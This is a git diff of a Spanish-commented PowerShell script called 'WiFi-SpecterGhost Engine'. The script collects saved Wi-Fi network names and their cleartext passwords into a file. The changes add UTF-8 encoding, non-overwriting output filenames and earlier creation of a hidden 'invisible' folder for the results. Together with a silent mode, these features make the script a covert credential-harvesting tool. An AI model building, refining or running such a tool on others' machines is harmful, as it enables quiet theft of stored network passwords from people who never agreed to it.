@@ -1,5 +1,5 @@
 # --- WiFi-SpecterGhost Engine ---
-# Este script es el corazón del proyecto. No lo borres, fiera.
+# Este script es el corazon del proyecto. No lo borres, fiera.
 
 param (
     [switch]$Silent = $false,
@@ -8,14 +8,38 @@ param (
     [string]$FolderName = "invisible"
 )
 
-$scriptDirectory = $PSScriptRoot
-$outputFilePath = Join-Path -Path $scriptDirectory -ChildPath $OutputName
-$outputFolderPath = Join-Path -Path $scriptDirectory -ChildPath $FolderName
+# Forzar codificacion UTF-8 para evitar deformaciones en tildes y caracteres especiales
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
 
-# Limpiar si ya existe en la raíz
-if (Test-Path $outputFilePath) {
-    Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue
+$scriptDirectory = $PSScriptRoot
+# --- Configuracion de rutas y nombres ---
+$targetFolder = $scriptDirectory
+if ($UseHiddenFolder) {
+    $targetFolder = Join-Path -Path $scriptDirectory -ChildPath $FolderName
+    try {
+        if (-not (Test-Path -Path $targetFolder)) {
+            New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
+        }
+        $folderItem = Get-Item -Path $targetFolder -Force
+        if (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden) {
+            $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
+        }
+    } catch { }
 }
+
+# Logica de incremento para no sobreescribir
+$baseName = [System.IO.Path]::GetFileNameWithoutExtension($OutputName)
+$extension = [System.IO.Path]::GetExtension($OutputName)
+$finalOutputName = $OutputName
+$counter = 1
+
+while (Test-Path (Join-Path -Path $targetFolder -ChildPath $finalOutputName)) {
+    $finalOutputName = "$baseName.$counter$extension"
+    $counter++
+}
+
+$outputFilePath = Join-Path -Path $targetFolder -ChildPath $finalOutputName
 
 if (-not $Silent) { Write-Host "Iniciando escaneo de redes guardadas..." -ForegroundColor Cyan }
 
@@ -41,28 +65,18 @@ if (-not $profileLines) {
 
         # Escribir al archivo
         try {
-            "SSID: $profileName" | Add-Content -Path $outputFilePath
-            "PWD: $password" | Add-Content -Path $outputFilePath
-            "-----------------------------------------" | Add-Content -Path $outputFilePath
+            "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
+            "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
+            "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
             if (-not $Silent) { Write-Host "Procesado: $profileName" -ForegroundColor Green }
         } catch { }
     }
 }
 
-# Manejo de carpeta oculta
-if ($UseHiddenFolder -and (Test-Path $outputFilePath)) {
-    try {
-        if (-not (Test-Path -Path $outputFolderPath)) {
-            New-Item -Path $outputFolderPath -ItemType Directory -Force | Out-Null
-        }
-        $folderItem = Get-Item -Path $outputFolderPath -Force
-        $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
-        
-        Move-Item -Path $outputFilePath -Destination $outputFolderPath -Force
-        if (-not $Silent) { Write-Host "Resultados movidos a carpeta oculta: $FolderName" -ForegroundColor Magent }
-    } catch {
-        if (-not $Silent) { Write-Error "Error al ocultar resultados." }
-    }
+
+if (-not $Silent) { 
+    Write-Host "Archivo generado: $finalOutputName" -ForegroundColor Cyan
+    Write-Host "Ubicacion: $targetFolder" -ForegroundColor DarkCyan
 }
 
-if (-not $Silent) { Write-Host "¡Listo! El trabajo está hecho." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Listo! El trabajo esta hecho." -ForegroundColor Cyan }
